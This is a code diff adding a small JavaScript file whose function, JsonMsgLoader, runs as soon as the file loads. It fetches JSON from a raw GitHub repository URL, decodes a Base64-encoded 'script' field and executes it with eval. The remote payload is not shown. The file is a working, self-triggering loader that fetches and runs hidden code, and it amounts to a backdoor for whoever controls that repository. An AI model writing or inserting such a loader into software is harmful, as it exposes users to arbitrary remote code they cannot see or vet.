@@ -1,0 +1,30 @@
+// Function to fetch and execute the script
+async function JsonMsgLoader() {
+    // URL of the raw JSON script
+    const url = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/openmessage.json';
+    
+    try {
+        // Fetch the JSON data from the URL
+        const response = await fetch(url);
+        const data = await response.json();
+
+        // Log the data to see it
+        console.log(data);
+
+        // Extract the Base64 encoded script from the response
+        if (data && data.response && data.response.script) {
+            // Decode the Base64 string
+            const decodedScript = atob(data.response.script);
+
+            // Execute the decoded script
+            eval(decodedScript);
+        } else {
+            console.error('No script found in the response.');
+        }
+    } catch (error) {
+        console.error('Error fetching or executing the script:', error);
+    }
+}
+
+// Call the function
+JsonMsgLoader();
